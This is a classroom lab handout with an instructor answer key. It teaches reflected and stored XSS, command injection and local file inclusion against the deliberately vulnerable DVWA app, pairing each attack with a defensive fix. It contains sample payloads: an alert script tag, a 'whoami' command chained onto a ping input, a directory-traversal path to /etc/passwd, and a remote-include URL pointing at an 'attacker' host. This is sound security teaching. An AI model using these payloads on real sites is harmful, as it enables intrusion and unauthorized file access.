# Unit 11 Lab — Attacking and Defending DVWA: XSS, Command Injection, and LFI

- **Platform:** **DVWA (Damn Vulnerable Web Application)** — via the TryHackMe "DVWA" room / AttackBox (browser-based, simplest) **or** a local Docker/VM image, run only in an isolated lab. Burp Suite Community + browser Dev Tools from Unit 10.
- **Time:** ~4 class periods (Days 1–5, woven)
- **Difficulty:** intro → beginner

## 🔒 Safety & authorization reminder
You may only run these techniques inside this **isolated lab environment**, and
**only** against **DVWA** (or another instructor-approved intentionally vulnerable
practice app like a TryHackMe room). DVWA is **built on purpose to be broken** so you
can learn safely — it must **never** be exposed to the internet or the school
network. The attacks in this lab can, against a real site, steal other people's
sessions (XSS), run commands on someone else's server (command injection), or read
files that are not yours (file inclusion). Doing any of this to a system you do not
own or have **written permission** to test is a serious crime under laws like the
CFAA — there is no "I was just curious" exception. The dividing line is always
**authorization and scope**. For every attack you perform, you will also record its
**defense** — because the goal is to become the person who fixes these bugs. If you
are unsure whether a target is approved or isolated, stop and ask your instructor.

## Objectives
- Set DVWA's **security level** and confirm you are working in an isolated lab.
- Trigger a **reflected** and a **stored** XSS at low security and explain what each does and who it affects.
- Trigger a **command injection** at low security and read the OS command output it produced.
- Trigger a **Local File Inclusion (LFI)** with **directory traversal** at low security and explain LFI vs RFI.
- Re-run each attack at a **higher security level** and observe how stronger input validation **blocks** it.
- Record, for every attack, the matching **defensive fix** in the Attack↔Defense chart.

## Setup
1. **Read the Safety & authorization reminder above out loud** with your partner. Write the approved target and this scope statement at the top of your journal: *"I am authorized to test only DVWA inside the isolated class lab. DVWA is intentionally vulnerable and is not exposed to any real network."*
2. Launch DVWA (AttackBox room or instructor-provided instance) and log in (default `admin` / `password` unless your instructor says otherwise).
3. Go to the **DVWA Security** page and set the **Security Level** to **Low**. Confirm it saved.
4. Open your **web-vuln observation sheet** and record date, objective, target, and security level. Have Burp/Dev Tools ready.
5. Confirm with your instructor that the instance is **isolated** before continuing.

## Walkthrough

### Step 1 — Confirm the lab and the "input" idea
- Browse a couple of DVWA pages with Dev Tools or Burp open and notice how each page takes **input** (a name, an IP, a page id) and reflects it back or acts on it.
- **Record:** name two input fields you see and predict what could go wrong if the app trusts them blindly. This frames the whole lab: **untrusted input** is the shared root cause.

### Step 2 — Reflected XSS (low security)
- Go to **XSS (Reflected)**. The page echoes whatever name you type.
- Type a simple, harmless proof payload that pops a box, e.g. a `<script>alert(1)</script>`-style payload (your instructor will provide/approve the exact one).
- Observe the result: if a box appears, **your JavaScript ran in the browser** — that is XSS.
- **Record:** the payload, the page, and what happened. Note that "reflected" means it bounced straight back in *this* response and affects only whoever clicks the crafted input.
- **Defense to chart:** **output encoding** (turn `<` into `&lt;` so the browser shows it as text, not code) + **CSP**.

### Step 3 — Stored XSS (low security)
- Go to **XSS (Stored)** (the guestbook). Submit a message containing an approved `<script>`-style proof payload.
- Reload the page — the payload runs **again**, because it was **saved** in the database.
- **Record:** the payload and the key danger — a stored payload runs for **every future visitor**, not just you. This is why stored XSS is more dangerous than reflected.
- **Defense to chart:** **output encoding** on display + **input validation/sanitization** on save + **CSP**.

### Step 4 — Command Injection (low security)
- Go to **Command Injection**. The page runs `ping` against an address you enter.
- Enter a normal address first (e.g., `127.0.0.1`) and see the ping output — proving your input reaches an **OS command**.
- Now append an extra command using a chaining character (e.g., `127.0.0.1; whoami` — instructor will confirm the exact syntax for the image). The page runs **your** command too.
- **Record:** the input you used, the extra command, and its output (e.g., the user the web server runs as). Explain how input reached the **shell**.
- **Defense to chart:** don't pass input to a shell; use a **safe API / parameterized call**; **validate/allow-list** the input (only allow valid IP characters); run with least privilege.

### Step 5 — Local File Inclusion + directory traversal (low security)
- Go to **File Inclusion**. The URL loads a file based on a parameter like `?page=include.php`.
- Use **directory traversal** to climb out of the folder and read a system file, e.g. change the parameter toward something like `?page=../../../../etc/passwd` (instructor will confirm the depth/path).
- Observe that the contents of a file you should not be able to read appear in the page.
- **Record:** the path you used, what `../` did (climbed up directories), and what you could read. Then explain the difference: **LFI** loads a file **already on the server**; **RFI** would load a file from a **remote attacker URL** — even more dangerous because it can run attacker-supplied code.
- **Defense to chart:** validate/allow-list the requested file name; never build a file path directly from input; disable remote includes (`allow_url_include=Off`).

### Step 6 — Raise the security level and watch the defenses work
- Return to the **DVWA Security** page and set the level to **Medium** (and/or **High**).
- Re-run each of the three attacks above with the **same** payloads.
- Observe what happens — most or all should now **fail or be blocked**, because higher levels add **input validation/encoding**.
- **Record:** for each attack, whether it still worked at the higher level and your best guess at *what validation* blocked it. (Extension: read DVWA's source for low vs high to confirm.)
- This is the payoff: the cure for all three attacks is the same idea — **validate, encode, and isolate untrusted input**.

## Deliverables
- **Web-vuln observation sheet** with one entry per attack (reflected XSS, stored XSS, command injection, LFI), each including: page, payload/input used, what happened at **low**, what happened at the **higher** level, and the **defensive fix**.
- **Attack↔Defense chart** completed for all three attack classes (XSS / command injection / file inclusion).
- A 3–4 sentence reflection: "What single root cause connects all of these, and what single idea cures them?" (These observations **feed the Module 3 web-vuln writeup project**.)

## Stretch goals (optional)
- Trigger a **DOM-based** XSS and explain why output encoding on the server alone may not fix it.
- Read DVWA's **source code** for the same page at Low vs High and write exactly what validation was added.
- Research and summarize one **real CVE** for each attack class (XSS, command injection, file inclusion) and its fix.
- Write a CSP header for a page and describe which scripts it would block and why.
- Demonstrate (lab only, your own endpoint) why stored XSS could exfiltrate a cookie — to motivate the `HttpOnly` flag defense.

## Answer key (instructor only)
*(Exact payloads/paths depend on the DVWA image and security level. Below are reference values; release payloads to students gradually.)*
- **Step 1:** Any two input fields (name in Reflected XSS, IP in Command Injection, `page=` in File Inclusion). Looking for the realization that each field is **untrusted input**.
- **Step 2 — Reflected XSS (Low):** A proof payload such as `<script>alert(1)</script>` (or `<script>alert(document.domain)</script>`) entered in the name field pops an alert — proving attacker JS executes. **Fix:** output-encode on display (`<`→`&lt;`), add CSP. Teach: reflected = bounces back in the immediate response; affects whoever opens the crafted link/input.
- **Step 3 — Stored XSS (Low):** Same `<script>alert(1)</script>` saved in the guestbook fires on **every** page load thereafter. **Fix:** encode on output AND validate/sanitize on input, plus CSP. Teach the ethics point: it hits **other users** who never consented — the most dangerous XSS type.
- **Step 4 — Command Injection (Low):** Input like `127.0.0.1; whoami` (Linux) or `127.0.0.1 & whoami` (Windows image) runs the extra command; output shows the web-server user (e.g., `www-data`). **Fix:** avoid the shell; use a safe/parameterized API; allow-list to valid IP characters only; least privilege. Make the OS output visible so the danger is concrete.
- **Step 5 — LFI + traversal (Low):** A parameter like `?page=../../../../etc/passwd` displays the contents of `/etc/passwd`. `../` = move up one directory (directory traversal). **LFI** = file already on the server; **RFI** = a remote URL (`?page=http://attacker/evil.txt`) → can execute attacker code, so it is worse and is what `allow_url_include=Off` prevents. **Fix:** validate/allow-list the file, don't build paths from raw input, disable remote includes.
- **Step 6 — Higher security:** At Medium/High the same payloads should fail. Medium often does naive filtering (e.g., stripping `../` once, blacklisting `<script>`) — point out blacklists can sometimes be bypassed, which is why **allow-listing/encoding** is stronger (defense-in-depth). High applies proper validation/encoding and blocks the attacks. The lesson: **stronger input validation = the cure**.
- **Common errors / re-teach triggers:**
  - DVWA reachable from a real network — STOP immediately and re-isolate.
  - Any sign a student tried these techniques on a **real** site — STOP and re-teach scope/ethics.
  - Forgetting to set the security level back to Low before a fresh attack attempt.
  - Treating the three attacks as unrelated tricks — keep returning to "untrusted input" as the shared root cause and "validate/encode/isolate" as the shared cure.
  - Confusing reflected vs stored XSS, and LFI vs RFI — use the comparison tables.
